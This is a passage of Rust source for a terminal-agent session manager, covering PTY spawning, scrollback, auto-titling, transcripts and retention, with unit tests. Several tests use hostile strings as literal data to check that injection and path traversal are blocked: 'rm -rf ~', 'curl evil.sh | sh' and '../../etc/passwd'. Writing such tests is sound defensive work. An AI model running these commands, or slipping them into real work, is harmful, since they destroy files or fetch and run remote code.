        // write can never land before the row it updates. It runs on its own
        // task and this request does not wait for it — seeding takes seconds
        // and a handler that blocked on it would be a hang.
        if let Some(prompt) = seed_prompt {
            tokio::spawn(seed_session_when_ready(
                db.clone(),
                session.clone(),
                prompt,
            ));
        }

        let info = session.info();
        self.sessions.insert(id, session);
        drop(guard);

        Ok(info)
    }

    /// Opens the PTY and wires up the three long-lived workers. Split out from
    /// `spawn_session` because it is entirely synchronous.
    fn start_pty(
        &self,
        db: &SqlitePool,
        id: &str,
        req: &SpawnRequest,
        plan: &SpawnPlan,
    ) -> Result<Arc<AgentSession>, AgentError> {
        let pty_system = native_pty_system();
        let pair = pty_system
            .openpty(PtySize {
                rows: if req.rows == 0 { 24 } else { req.rows },
                cols: if req.cols == 0 { 80 } else { req.cols },
                pixel_width: 0,
                pixel_height: 0,
            })
            .map_err(|e| AgentError::Spawn(e.to_string()))?;

        let mut child = pair
            .slave
            .spawn_command(plan.to_command_builder())
            .map_err(|e| AgentError::Spawn(e.to_string()))?;

        // Drop our copy of the slave immediately. While the parent holds it the
        // slave fd stays open, so the master reader would never see EOF and the
        // session would look alive forever after the child exits.
        drop(pair.slave);

        let mut reader = pair
            .master
            .try_clone_reader()
            .map_err(|e| AgentError::Spawn(e.to_string()))?;
        let writer = pair
            .master
            .take_writer()
            .map_err(|e| AgentError::Spawn(e.to_string()))?;

        let pid = child.process_id();
        let killer = child.clone_killer();

        let (output_tx, _) = broadcast::channel::<Arc<[u8]>>(OUTPUT_CHANNEL_CAPACITY);
        let scrollback = Arc::new(Mutex::new(ScrollbackBuffer::new(SCROLLBACK_CAPACITY)));
        let last_output = Arc::new(Mutex::new(Instant::now()));
        let saw_output = Arc::new(std::sync::atomic::AtomicBool::new(false));
        let title = Arc::new(Mutex::new(req.title.clone()));
        let title_is_custom = Arc::new(std::sync::atomic::AtomicBool::new(req.title_is_custom));

        let session = Arc::new(AgentSession {
            id: id.to_string(),
            workspace_id: req.workspace_id.clone(),
            definition_id: req.definition_id.clone(),
            cwd: plan.cwd.clone(),
            title: title.clone(),
            title_is_custom: title_is_custom.clone(),
            scrollback: scrollback.clone(),
            output_tx: output_tx.clone(),
            writer: Arc::new(Mutex::new(writer)),
            master: Arc::new(Mutex::new(pair.master)),
            killer: Mutex::new(killer),
            pid,
            status: Mutex::new(SessionStatus::Running),
            last_output: last_output.clone(),
            saw_output: saw_output.clone(),
            seed_claimed: std::sync::atomic::AtomicBool::new(false),
            prompt_patterns: self.compiled_patterns(&req.prompt_patterns),
        });

        // Thread 1 — blocking PTY reader. Ends at EOF, which happens once the
        // child exits and the slave fd is fully closed.
        let (pty_tx, mut pty_rx) = tokio::sync::mpsc::channel::<Vec<u8>>(PTY_CHANNEL_CAPACITY);
        std::thread::spawn(move || {
            let mut buf = [0u8; 8192];
            loop {
                match reader.read(&mut buf) {
                    Ok(0) | Err(_) => break,
                    Ok(n) => {
                        if pty_tx.blocking_send(buf[..n].to_vec()).is_err() {
                            break;
                        }
                    }
                }
            }
        });

        // Task — fans output out to subscribers. Holds the scrollback lock
        // across push+broadcast so `attach` cannot interleave (see `attach`).
        // `broadcast::send` never blocks and never fails on a full or empty
        // subscriber set, so a stalled socket cannot back up the PTY.
        let pump_db = db.clone();
        let pump_id = id.to_string();
        // The durable half of the scrollback. Started here so the file exists
        // from the session's first byte, not from its last: a crash mid-run is
        // exactly when the transcript matters.
        let transcript = self
            .transcripts
            .as_ref()
            .and_then(|store| store.writer(id));
        tokio::spawn(async move {
            let mut last_touch: i64 = 0;
            // Auto-title state. `opening` accumulates separately from the
            // scrollback because the ring evicts from the FRONT — the first
            // line an agent prints is exactly what a busy session loses first.
            let mut opening: Vec<u8> = Vec::new();
            let mut auto_title_pending = !title_is_custom.load(std::sync::atomic::Ordering::SeqCst);
            let auto_title_deadline = Instant::now() + AUTO_TITLE_WINDOW;

            while let Some(chunk) = pty_rx.recv().await {
                let chunk: Arc<[u8]> = chunk.into();
                {
                    let mut sb = scrollback.lock().expect("scrollback mutex");
                    sb.push(&chunk);
                    let _ = output_tx.send(chunk.clone());
                }

                // Outside the lock and non-blocking: the transcript must never
                // be in the way of the bytes reaching an attached socket.
                if let Some(writer) = &transcript {
                    writer.write(&chunk);
                }

                // The in-memory signal `activity` is derived from. Updated on
                // every chunk (it is one monotonic clock read), unlike the
                // throttled SQLite write below, which exists only for display.
                *last_output.lock().expect("last_output mutex") = Instant::now();
                saw_output.store(true, std::sync::atomic::Ordering::Relaxed);

                if auto_title_pending {
                    if opening.len() < AUTO_TITLE_SCAN_BYTES {
                        let room = AUTO_TITLE_SCAN_BYTES - opening.len();
                        opening.extend_from_slice(&chunk[..chunk.len().min(room)]);
                    }

                    auto_title_pending = if title_is_custom.load(std::sync::atomic::Ordering::SeqCst)
                    {
                        // The user renamed the session while it was starting.
                        // Their title wins, permanently.
                        false
                    } else if let Some(derived) = extract_auto_title(&opening) {
                        apply_auto_title(&pump_db, &pump_id, &title, &title_is_custom, &derived)
                            .await;
                        false
                    } else {
                        // Give up rather than keep watching: past the opening
                        // window a title would describe a random later moment.
                        opening.len() < AUTO_TITLE_SCAN_BYTES
                            && Instant::now() < auto_title_deadline
                    };
                }

                let now = chrono::Utc::now().timestamp();
                if now - last_touch >= ACTIVITY_TOUCH_INTERVAL_SECS {
                    last_touch = now;
                    let _ = sqlx::query(
                        "UPDATE agent_sessions SET last_activity_at = datetime('now') WHERE id = ?",
                    )
                    .bind(&pump_id)
                    .execute(&pump_db)
                    .await;
                }
            }
        });

        // Thread 2 — reaps the child. `wait()` is blocking and must not run on
        // the executor; it hands the status to an async task via oneshot.
        let (exit_tx, exit_rx) = oneshot::channel::<Option<i32>>();
        std::thread::spawn(move || {
            let code = child.wait().ok().map(|s| s.exit_code() as i32);
            let _ = exit_tx.send(code);
        });

        // Task — records the exit. The session stays in the registry with its
        // scrollback intact so the user can still attach and read the ending.
        let exit_db = db.clone();
        let exit_session = session.clone();
        tokio::spawn(async move {
            let code = exit_rx.await.ok().flatten();
            *exit_session.status.lock().expect("status mutex") = SessionStatus::Exited { code };
            let _ = sqlx::query(
                "UPDATE agent_sessions
                 SET status = 'exited', exit_code = ?, exited_at = datetime('now'),
                     last_activity_at = datetime('now')
                 WHERE id = ?",
            )
            .bind(code.map(|c| c as i64))
            .bind(&exit_session.id)
            .execute(&exit_db)
            .await;
        });

        Ok(session)
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn scrollback_keeps_everything_below_capacity() {
        let mut sb = ScrollbackBuffer::new(16);
        sb.push(b"hello ");
        sb.push(b"world");
        assert_eq!(sb.len(), 11);
        assert_eq!(sb.snapshot(), b"hello world".to_vec());
    }

    #[test]
    fn scrollback_truncates_at_capacity() {
        let mut sb = ScrollbackBuffer::new(8);
        sb.push(b"0123456789");
        assert_eq!(sb.len(), 8);
        assert_eq!(sb.capacity(), 8);
    }

    #[test]
    fn replay_after_truncation_returns_the_newest_bytes() {
        // The whole point of the ring: reattaching mid-task must show what just
        // happened, not what happened first.
        let mut sb = ScrollbackBuffer::new(8);
        sb.push(b"0123456789");
        assert_eq!(sb.snapshot(), b"23456789".to_vec());

        sb.push(b"abc");
        assert_eq!(sb.snapshot(), b"56789abc".to_vec());
        assert_eq!(sb.len(), 8);
    }

    #[test]
    fn scrollback_single_write_larger_than_capacity_keeps_its_tail() {
        let mut sb = ScrollbackBuffer::new(4);
        sb.push(b"xx");
        sb.push(b"ABCDEFGH");
        assert_eq!(sb.snapshot(), b"EFGH".to_vec());
    }

    #[test]
    fn scrollback_zero_capacity_keeps_nothing() {
        let mut sb = ScrollbackBuffer::new(0);
        sb.push(b"anything");
        assert!(sb.is_empty());
        assert_eq!(sb.snapshot(), Vec::<u8>::new());
    }

    #[test]
    fn scrollback_stays_bounded_across_many_writes() {
        let mut sb = ScrollbackBuffer::new(1024);
        for _ in 0..5000 {
            sb.push(b"an agent looping and printing a line\n");
        }
        assert_eq!(sb.len(), 1024);
    }

    fn plan_for(program: &str, args: &[&str]) -> SpawnPlan {
        build_spawn_plan(
            program,
            &args.iter().map(|s| s.to_string()).collect::<Vec<_>>(),
            Path::new("/tmp/ws"),
            None,
            &[],
        )
        .expect("plan")
    }

    #[test]
    fn spawn_plan_keeps_program_and_argv_separate() {
        let plan = plan_for("claude", &["--print", "do the thing"]);
        assert_eq!(plan.program, "claude");
        assert_eq!(plan.args, vec!["--print", "do the thing"]);
        assert_eq!(plan.cwd, PathBuf::from("/tmp/ws"));
    }

    #[test]
    fn spawn_plan_never_builds_a_shell_string() {
        // A hostile argument must stay one literal argv element, and the
        // program must never become a shell.
        let plan = plan_for("agent", &["; rm -rf ~", "$(whoami)", "&& curl evil.sh | sh"]);
        assert_eq!(plan.program, "agent");
        assert!(!plan.program.contains("sh"));
        assert_eq!(plan.args.len(), 3);
        assert_eq!(plan.args[0], "; rm -rf ~");
        assert_eq!(plan.args[1], "$(whoami)");
        assert_eq!(plan.args[2], "&& curl evil.sh | sh");
    }

    #[test]
    fn spawn_plan_carries_a_hostile_cwd_verbatim() {
        // A workspace folder named `foo; rm -rf ~` is a path, not a command.
        let dir = Path::new("/tmp/foo; rm -rf ~");
        let plan = build_spawn_plan("agent", &[], dir, None, &[]).expect("plan");
        assert_eq!(plan.cwd, dir);
        assert!(plan.args.is_empty());
    }

    #[test]
    fn spawn_plan_rejects_an_empty_program() {
        assert!(matches!(
            build_spawn_plan("", &[], Path::new("/tmp"), None, &[]),
            Err(AgentError::EmptyCommand)
        ));
        assert!(matches!(
            build_spawn_plan("   ", &[], Path::new("/tmp"), None, &[]),
            Err(AgentError::EmptyCommand)
        ));
    }

    #[test]
    fn spawn_plan_sets_term_and_kubeconfig_when_configured() {
        let plan = build_spawn_plan(
            "agent",
            &[],
            Path::new("/tmp"),
            Some("/home/u/.kube/config"),
            &[],
        )
        .expect("plan");
        assert_eq!(
            plan.env,
            vec![
                ("TERM".to_string(), "xterm-256color".to_string()),
                (
                    "KUBECONFIG".to_string(),
                    "/home/u/.kube/config".to_string()
                ),
            ]
        );
    }

    #[test]
    fn spawn_plan_omits_kubeconfig_when_unset_or_blank() {
        let plan = build_spawn_plan("agent", &[], Path::new("/tmp"), None, &[]).expect("plan");
        assert_eq!(plan.env, vec![("TERM".to_string(), "xterm-256color".to_string())]);

        let blank =
            build_spawn_plan("agent", &[], Path::new("/tmp"), Some("  "), &[]).expect("plan");
        assert_eq!(blank.env.len(), 1);
    }

    #[test]
    fn spawn_plan_env_merge_order_lets_the_definition_win() {
        let extra = vec![
            ("TERM".to_string(), "dumb".to_string()),
            ("MY_VAR".to_string(), "1".to_string()),
        ];
        let plan =
            build_spawn_plan("agent", &[], Path::new("/tmp"), Some("/kc"), &extra).expect("plan");
        // Order matters: CommandBuilder::env is last-write-wins, so the
        // definition's TERM must come after the default.
        assert_eq!(
            plan.env
                .iter()
                .map(|(k, _)| k.as_str())
                .collect::<Vec<_>>(),
            vec!["TERM", "KUBECONFIG", "TERM", "MY_VAR"]
        );
        assert_eq!(plan.env.last().unwrap().1, "1");
        assert_eq!(plan.env[2].1, "dumb");
    }

    #[test]
    fn capacity_error_maps_to_429() {
        let err: AppError = AgentError::CapacityExceeded { max: 16 }.into();
        assert!(matches!(err, AppError::TooManyRequests(_)));
    }

    #[test]
    fn nowhere_to_run_maps_to_400_not_a_home_fallback() {
        let err: AppError = AgentError::NoCwd("ws1".into()).into();
        match err {
            AppError::BadRequest(msg) => {
                // The message must name both ways out, since either fixes it.
                assert!(msg.contains("bind a folder"));
                assert!(msg.contains("explicit cwd"));
            }
            other => panic!("expected BadRequest, got {other:?}"),
        }
    }

    #[test]
    fn a_missing_directory_maps_to_400_naming_the_path() {
        // Which path failed is the whole content of the error — "not a
        // directory" without the path leaves the user guessing.
        let explicit: AppError = AgentError::CwdMissing("/tmp/gone".into()).into();
        match explicit {
            AppError::BadRequest(msg) => {
                assert!(msg.contains("/tmp/gone"));
                assert!(msg.contains("cwd"));
            }
            other => panic!("expected BadRequest, got {other:?}"),
        }

        let folder: AppError = AgentError::WorkspaceFolderMissing("/tmp/ws".into()).into();
        match folder {
            AppError::BadRequest(msg) => {
                assert!(msg.contains("/tmp/ws"));
                assert!(msg.contains("workspace folder"));
            }
            other => panic!("expected BadRequest, got {other:?}"),
        }
    }

    // -- cwd precedence ----------------------------------------------------

    #[test]
    fn an_explicit_cwd_wins_over_the_workspace_folder() {
        assert_eq!(
            choose_cwd(Some("/tmp/elsewhere"), Some("/tmp/ws")),
            Some(CwdChoice::Explicit("/tmp/elsewhere".to_string()))
        );
    }

    #[test]
    fn the_workspace_folder_is_the_default() {
        assert_eq!(
            choose_cwd(None, Some("/tmp/ws")),
            Some(CwdChoice::WorkspaceFolder("/tmp/ws".to_string()))
        );
    }

    #[test]
    fn an_explicit_cwd_works_without_any_bound_folder() {
        // The case the loosened 400 exists for: a folder-less workspace can
        // still run an agent when the request says where.
        assert_eq!(
            choose_cwd(Some("/tmp/elsewhere"), None),
            Some(CwdChoice::Explicit("/tmp/elsewhere".to_string()))
        );
    }

    #[test]
    fn neither_a_cwd_nor_a_folder_is_the_only_failure() {
        assert_eq!(choose_cwd(None, None), None);
    }

    #[test]
    fn a_blank_cwd_or_folder_counts_as_absent() {
        // An empty string reaches here from both an untouched form field and a
        // `folder_path` cleared by unbinding.
        assert_eq!(choose_cwd(Some("   "), None), None);
        assert_eq!(choose_cwd(None, Some("")), None);
        assert_eq!(
            choose_cwd(Some("  "), Some("/tmp/ws")),
            Some(CwdChoice::WorkspaceFolder("/tmp/ws".to_string()))
        );
    }

    #[test]
    fn a_chosen_path_is_trimmed_but_otherwise_verbatim() {
        // A path is data: spaces inside it, and every metacharacter, survive.
        let choice = choose_cwd(Some("  /tmp/foo; rm -rf ~  "), None).expect("choice");
        assert_eq!(choice.path(), "/tmp/foo; rm -rf ~");
    }

    // -- auto-title --------------------------------------------------------

    #[test]
    fn the_first_meaningful_line_becomes_the_title() {
        assert_eq!(
            extract_auto_title(b"Analyzing the workspace layout\nnext line\n"),
            Some("Analyzing the workspace layout".to_string())
        );
    }

    #[test]
    fn ansi_colour_codes_are_stripped() {
        let out = b"\x1b[1;32mBuilding the release binary\x1b[0m\n";
        assert_eq!(
            extract_auto_title(out),
            Some("Building the release binary".to_string())
        );
    }

    #[test]
    fn cursor_moves_and_osc_titles_are_stripped() {
        // An agent's opening frame is mostly terminal control, not text.
        let out = b"\x1b[2J\x1b[H\x1b]0;claude\x07Reading the project files\n";
        assert_eq!(
            extract_auto_title(out),
            Some("Reading the project files".to_string())
        );
    }

    #[test]
    fn box_rules_and_spinner_frames_are_skipped() {
        let out = "╭──────────────────────────╮\n⠋\n⠙\n│ Starting the agent run │\n";
        assert_eq!(
            extract_auto_title(out.as_bytes()),
            Some("Starting the agent run".to_string())
        );
    }

    #[test]
    fn ascii_art_banners_are_skipped() {
        // Figlet-style art is punctuation, so it never clears the alphanumeric
        // floor — the tagline underneath does.
        let out = "  ___ _              _ \n / __| |__ _ _  _ __| |\n| (__| / _` | || / _` |\n \\___|_\\__,_|\\_,_\\__,_|\n\nStarting a coding session\n";
        assert_eq!(
            extract_auto_title(out.as_bytes()),
            Some("Starting a coding session".to_string())
        );
    }

    #[test]
    fn a_shell_prompt_alone_is_not_a_title() {
        assert_eq!(extract_auto_title(b"$ \n> \n%\n"), None);
    }

    #[test]
    fn a_leading_path_separator_or_dot_survives() {
        // Trimming these would quietly rewrite the agent's own words.
        assert_eq!(
            extract_auto_title(b"/srv/app/backend\n"),
            Some("/srv/app/backend".to_string())
        );
        assert_eq!(
            extract_auto_title(b".gitignore updated\n"),
            Some(".gitignore updated".to_string())
        );
    }

    #[test]
    fn no_reasonable_line_leaves_the_default() {
        // The honest outcome: a bad auto-title is worse than none at all.
        assert_eq!(extract_auto_title(b""), None);
        assert_eq!(extract_auto_title(b"\n\n   \n\t\n"), None);
        assert_eq!(extract_auto_title("═══════\n▁▂▃▄▅\n".as_bytes()), None);
        assert_eq!(extract_auto_title(b"\x1b[2J\x1b[H\x1b[0m\n"), None);
    }

    #[test]
    fn an_unterminated_line_is_not_used_yet() {
        // The tail of a live stream is usually half-written; titling a session
        // "Reading src/ma" would be worse than waiting one more chunk.
        assert_eq!(extract_auto_title(b"Reading src/ma"), None);
        assert_eq!(
            extract_auto_title(b"Reading src/main.rs\nAnd then some half-writ"),
            Some("Reading src/main.rs".to_string())
        );
    }

    #[test]
    fn a_carriage_return_terminates_a_line_too() {
        // TUI agents redraw a status line without ever emitting `\n`.
        assert_eq!(
            extract_auto_title(b"Loading the model config\rLoading the model config."),
            Some("Loading the model config".to_string())
        );
    }

    #[test]
    fn a_long_line_is_truncated_with_an_ellipsis() {
        let long = "a".repeat(200);
        let title = extract_auto_title(format!("{long}\n").as_bytes()).expect("title");
        assert_eq!(title.chars().count(), AUTO_TITLE_MAX_CHARS);
        assert!(title.ends_with('…'));
    }

    #[test]
    fn truncation_counts_characters_not_bytes() {
        // Agents print emoji and box drawing; a byte slice would land
        // mid-codepoint and produce mojibake.
        let long = "é".repeat(200);
        let title = extract_auto_title(format!("{long}\n").as_bytes()).expect("title");
        assert_eq!(title.chars().count(), AUTO_TITLE_MAX_CHARS);
    }

    #[test]
    fn a_line_at_the_limit_is_left_alone() {
        let exact = "b".repeat(AUTO_TITLE_MAX_CHARS);
        assert_eq!(
            extract_auto_title(format!("{exact}\n").as_bytes()),
            Some(exact)
        );
    }

    #[test]
    fn a_tail_that_starts_mid_codepoint_does_not_panic_while_titling() {
        let mut bytes = vec![0x9f, 0x92, 0xa9];
        bytes.extend_from_slice(b" resuming the session\n");
        assert!(extract_auto_title(&bytes).is_some());
    }

    #[test]
    fn strip_ansi_keeps_the_text_and_drops_the_controls() {
        assert_eq!(strip_ansi("\x1b[31mred\x1b[0m text"), "red text");
        assert_eq!(strip_ansi("a\tb"), "a b");
        assert_eq!(strip_ansi("bell\x07"), "bell");
        // A window may begin inside a sequence; an unterminated escape simply
        // consumes the rest rather than leaking `[38;5;`.
        assert_eq!(strip_ansi("\x1b[38;5;"), "");
    }

    // -- activity heuristic ------------------------------------------------

    fn ms(n: u64) -> Duration {
        Duration::from_millis(n)
    }

    #[test]
    fn recent_output_reads_as_working() {
        assert_eq!(
            derive_activity(true, ms(0), ACTIVITY_WORKING_WINDOW),
            Activity::Working
        );
        assert_eq!(
            derive_activity(true, ms(1499), ACTIVITY_WORKING_WINDOW),
            Activity::Working
        );
    }

    #[test]
    fn silence_past_the_window_reads_as_waiting() {
        // The boundary belongs to `waiting`: at exactly the window the session
        // has been silent for the full period.
        assert_eq!(
            derive_activity(true, ms(1500), ACTIVITY_WORKING_WINDOW),
            Activity::Waiting
        );
        assert_eq!(
            derive_activity(true, ms(60_000), ACTIVITY_WORKING_WINDOW),
            Activity::Waiting
        );
    }

    #[test]
    fn a_dead_process_is_exited_however_recently_it_spoke() {
        // `exited` is the one authoritative state — it must never be masked by
        // the output-recency guess.
        assert_eq!(
            derive_activity(false, ms(0), ACTIVITY_WORKING_WINDOW),
            Activity::Exited
        );
        assert_eq!(
            derive_activity(false, ms(999_999), ACTIVITY_WORKING_WINDOW),
            Activity::Exited
        );
    }

    #[test]
    fn activity_strings_are_the_wire_values() {
        assert_eq!(Activity::Working.as_str(), "working");
        assert_eq!(Activity::Waiting.as_str(), "waiting");
        assert_eq!(Activity::Exited.as_str(), "exited");
        assert_eq!(WaitingConfidence::High.as_str(), "high");
        assert_eq!(WaitingConfidence::Low.as_str(), "low");
    }

    // -- prompt patterns ---------------------------------------------------

    fn patterns(list: &[&str]) -> PromptPatterns {
        PromptPatterns::compile(&list.iter().map(|s| s.to_string()).collect::<Vec<_>>())
    }

    #[test]
    fn a_prompt_in_the_tail_matches() {
        let p = patterns(&[r"\(y/n\)", r"Do you want to"]);
        assert!(p.matches(b"Do you want to create foo.rs? (y/n) "));
        assert!(p.matches(b"...\nWrite the file? (y/n)"));
    }

    #[test]
    fn ordinary_output_does_not_match() {
        let p = patterns(&[r"\(y/n\)"]);
        assert!(!p.matches(b"compiling backend v0.7.0\n"));
        assert!(!p.matches(b""));
    }

    #[test]
    fn a_definition_without_patterns_never_matches() {
        let p = patterns(&[]);
        assert!(p.is_empty());
        assert!(!p.matches(b"Do you want to proceed? (y/n)"));
    }

    #[test]
    fn an_invalid_pattern_is_skipped_not_panicked_on() {
        // A user typo must cost that one pattern, nothing else.
        let p = patterns(&["(unclosed", r"\(y/n\)", "*bad"]);
        assert!(!p.is_empty());
        assert!(p.matches(b"proceed? (y/n)"));
        assert!(!p.matches(b"(unclosed"));
    }

    #[test]
    fn only_invalid_patterns_leaves_an_empty_set() {
        let p = patterns(&["(unclosed", "*bad"]);
        assert!(p.is_empty());
        assert!(!p.matches(b"anything at all"));
    }

    #[test]
    fn a_tail_that_starts_mid_codepoint_does_not_panic() {
        // `tail` slices bytes, so the window can begin inside a UTF-8
        // sequence; matching must be lossy rather than fallible.
        let mut bytes = vec![0x9f, 0x92, 0xa9]; // trailing bytes of an emoji
        bytes.extend_from_slice(b" continue? (y/n)");
        let p = patterns(&[r"\(y/n\)"]);
        assert!(p.matches(&bytes));
    }

    // -- confidence --------------------------------------------------------

    #[test]
    fn a_matching_prompt_raises_waiting_confidence() {
        let p = patterns(&[r"\(y/n\)"]);
        assert_eq!(
            derive_waiting_confidence(Activity::Waiting, &p, b"overwrite? (y/n)"),
            Some(WaitingConfidence::High)
        );
    }

    #[test]
    fn silence_without_a_prompt_stays_low_confidence() {
        // The honest case: a quiet build looks exactly like a quiet prompt.
        let p = patterns(&[r"\(y/n\)"]);
        assert_eq!(
            derive_waiting_confidence(Activity::Waiting, &p, b"   Compiling serde v1.0"),
            Some(WaitingConfidence::Low)
        );
    }

    #[test]
    fn confidence_is_absent_unless_waiting() {
        let p = patterns(&[r"\(y/n\)"]);
        // Even when the text matches — a working or dead session is not
        // "waiting with high confidence".
        assert_eq!(
            derive_waiting_confidence(Activity::Working, &p, b"overwrite? (y/n)"),
            None
        );
        assert_eq!(
            derive_waiting_confidence(Activity::Exited, &p, b"overwrite? (y/n)"),
            None
        );
    }

    // -- scrollback tail ---------------------------------------------------

    #[test]
    fn tail_returns_the_newest_bytes_only() {
        let mut sb = ScrollbackBuffer::new(64);
        sb.push(b"0123456789");
        assert_eq!(sb.tail(4), b"6789".to_vec());
    }

    #[test]
    fn tail_larger_than_the_buffer_returns_everything() {
        let mut sb = ScrollbackBuffer::new(64);
        sb.push(b"hi");
        assert_eq!(sb.tail(2048), b"hi".to_vec());
        assert_eq!(ScrollbackBuffer::new(64).tail(2048), Vec::<u8>::new());
    }

    #[test]
    fn tail_survives_a_wrapped_ring() {
        // After eviction the VecDeque is in two slices; the tail must still
        // read in order.
        let mut sb = ScrollbackBuffer::new(8);
        sb.push(b"0123456789");
        assert_eq!(sb.tail(3), b"789".to_vec());
    }

    #[test]
    fn a_prompt_is_found_in_a_realistic_scrollback_tail() {
        let mut sb = ScrollbackBuffer::new(SCROLLBACK_CAPACITY);
        for _ in 0..2000 {
            sb.push(b"[tool] reading src/main.rs\n");
        }
        sb.push(b"\nDo you want to make this edit? (y/n) ");

        let p = patterns(&[r"Do you want to"]);
        assert!(p.matches(&sb.tail(PROMPT_SCAN_BYTES)));
    }

    #[test]
    fn an_old_prompt_scrolled_out_of_the_window_no_longer_matches() {
        // Otherwise an answered question would pin the session to `high`
        // confidence for the rest of its life.
        let mut sb = ScrollbackBuffer::new(SCROLLBACK_CAPACITY);
        sb.push(b"Do you want to make this edit? (y/n) y\n");
        for _ in 0..500 {
            sb.push(b"[tool] writing a line of output.......\n");
        }

        let p = patterns(&[r"Do you want to"]);
        assert!(!p.matches(&sb.tail(PROMPT_SCAN_BYTES)));
        // Still present further back — it is the window that excludes it.
        assert!(p.matches(&sb.snapshot()));
    }

    #[test]
    fn empty_registry_has_no_live_sessions() {
        let reg = AgentRegistry::new();
        assert_eq!(reg.live_count(), 0);
        assert!(reg.list(None).is_empty());
        assert!(reg.get("nope").is_none());
    }

    // -- transcript paths --------------------------------------------------

    const A_UUID: &str = "3f2b1c4a-9d8e-4f10-8a2b-5c6d7e8f9a0b";

    #[test]
    fn a_session_id_becomes_its_log_file_name() {
        assert_eq!(
            transcript_file_name(A_UUID),
            Some(format!("{A_UUID}.log"))
        );
    }

    #[test]
    fn a_non_uuid_id_never_becomes_a_path() {
        // The whole point of the check: nothing that is not a plain UUID may
        // reach the filesystem, sanitized or otherwise.
        for hostile in [
            "",
            "   ",
            "not-a-uuid",
            "../../etc/passwd",
            "../3f2b1c4a-9d8e-4f10-8a2b-5c6d7e8f9a0b",
            "3f2b1c4a-9d8e-4f10-8a2b-5c6d7e8f9a0b/../../x",
            "3f2b1c4a-9d8e-4f10-8a2b-5c6d7e8f9a0b\0",
            "3f2b1c4a-9d8e-4f10-8a2b-5c6d7e8f9a0b.log",
            // Valid UUIDs, but not the shape our ids have — accepting them
            // would map two spellings onto one session.
            "{3f2b1c4a-9d8e-4f10-8a2b-5c6d7e8f9a0b}",
            "urn:uuid:3f2b1c4a-9d8e-4f10-8a2b-5c6d7e8f9a0b",
            "3f2b1c4a9d8e4f108a2b5c6d7e8f9a0b",
        ] {
            assert_eq!(transcript_file_name(hostile), None, "accepted {hostile:?}");
        }
    }

    #[test]
    fn a_rejected_id_yields_no_path_and_no_writer() {
        let store = TranscriptStore::new(PathBuf::from("/tmp/agent-logs"));
        assert!(store.path_for("../escape").is_none());
        assert_eq!(
            store.path_for(A_UUID),
            Some(PathBuf::from(format!("/tmp/agent-logs/{A_UUID}.log")))
        );
    }

    #[test]
    fn only_our_own_log_files_are_recognised() {
        assert_eq!(
            transcript_id_from_file_name(&format!("{A_UUID}.log")),
            Some(A_UUID.to_string())
        );
        // A half-written compaction and anything else in the directory are not
        // sessions and must not be reported as transcripts.
        assert_eq!(transcript_id_from_file_name(&format!("{A_UUID}.log.tmp")), None);
        assert_eq!(transcript_id_from_file_name("notes.txt"), None);
        assert_eq!(transcript_id_from_file_name(".log"), None);
    }

    #[test]
    fn the_transcript_directory_sits_beside_the_database() {
        assert_eq!(
            transcript_dir_for_database_url(
                "file:/Users/x/Library/Application Support/KlustrEye/klustreye.db"
            ),
            PathBuf::from("/Users/x/Library/Application Support/KlustrEye/agent-logs")
        );
        assert_eq!(
            transcript_dir_for_database_url("sqlite:///tmp/t/klustreye.db?mode=rwc"),
            PathBuf::from("/tmp/t/agent-logs")
        );
        // No directory part: relative to the working directory, which is what
        // a bare database filename already asked for.
        assert_eq!(
            transcript_dir_for_database_url("klustreye.db"),
            PathBuf::from("./agent-logs")
        );
    }

    // -- transcript truncation ---------------------------------------------

    #[test]
    fn truncation_keeps_the_newest_bytes() {
        // Same rule as the in-memory ring: reading an archived session must
        // show how it ended, not how it began.
        assert_eq!(tail_bytes(b"0123456789", 4), b"6789");
        assert_eq!(tail_bytes(b"0123456789", 10), b"0123456789");
        assert_eq!(tail_bytes(b"0123456789", 99), b"0123456789");
        assert_eq!(tail_bytes(b"", 8), b"");
        assert_eq!(tail_bytes(b"0123456789", 0), b"");
    }

    #[test]
    fn truncation_happens_only_past_the_slack() {
        // Compacting on the first byte over the cap would copy a megabyte per
        // flush for the rest of the session.
        assert!(!needs_compaction(TRANSCRIPT_CAP, TRANSCRIPT_CAP, TRANSCRIPT_SLACK));
        assert!(!needs_compaction(
            TRANSCRIPT_CAP + TRANSCRIPT_SLACK,
            TRANSCRIPT_CAP,
            TRANSCRIPT_SLACK
        ));
        assert!(needs_compaction(
            TRANSCRIPT_CAP + TRANSCRIPT_SLACK + 1,
            TRANSCRIPT_CAP,
            TRANSCRIPT_SLACK
        ));
    }

    #[test]
    fn compaction_leaves_a_file_at_the_cap_not_at_the_slack() {
        // A runaway agent is bounded by the cap, not by cap+slack: the rewrite
        // drops everything above the cap in one go.
        let runaway = vec![b'x'; TRANSCRIPT_CAP + TRANSCRIPT_SLACK + 4096];
        assert_eq!(tail_bytes(&runaway, TRANSCRIPT_CAP).len(), TRANSCRIPT_CAP);
    }

    // -- retention ---------------------------------------------------------

    fn rows(pairs: &[(&str, &str)]) -> Vec<(String, String)> {
        pairs
            .iter()
            .map(|(ws, id)| (ws.to_string(), id.to_string()))
            .collect()
    }

    #[test]
    fn nothing_is_pruned_below_the_cap() {
        let sessions = rows(&[("ws1", "s3"), ("ws1", "s2"), ("ws1", "s1")]);
        assert!(sessions_to_prune(&sessions, 3).is_empty());
        assert!(sessions_to_prune(&sessions, 200).is_empty());
        assert!(sessions_to_prune(&[], 200).is_empty());
    }

    #[test]
    fn the_oldest_sessions_past_the_cap_are_pruned() {
        // Input is newest first, so the tail is the oldest — those go.
        let sessions = rows(&[("ws1", "s4"), ("ws1", "s3"), ("ws1", "s2"), ("ws1", "s1")]);
        assert_eq!(sessions_to_prune(&sessions, 2), vec!["s2", "s1"]);
        assert_eq!(sessions_to_prune(&sessions, 1), vec!["s3", "s2", "s1"]);
    }

    #[test]
    fn the_cap_is_per_workspace_not_global() {
        // Otherwise one busy workspace would evict another's history — the
        // rule has to be one a user can predict from their own workspace.
        let sessions = rows(&[
            ("ws1", "a3"),
            ("ws1", "a2"),
            ("ws1", "a1"),
            ("ws2", "b2"),
            ("ws2", "b1"),
        ]);
        assert_eq!(sessions_to_prune(&sessions, 2), vec!["a1"]);
        assert_eq!(sessions_to_prune(&sessions, 1), vec!["a2", "a1", "b1"]);
    }

    #[test]
    fn a_zero_cap_prunes_everything() {
        let sessions = rows(&[("ws1", "a2"), ("ws1", "a1")]);
        assert_eq!(sessions_to_prune(&sessions, 0), vec!["a2", "a1"]);
    }

    #[test]
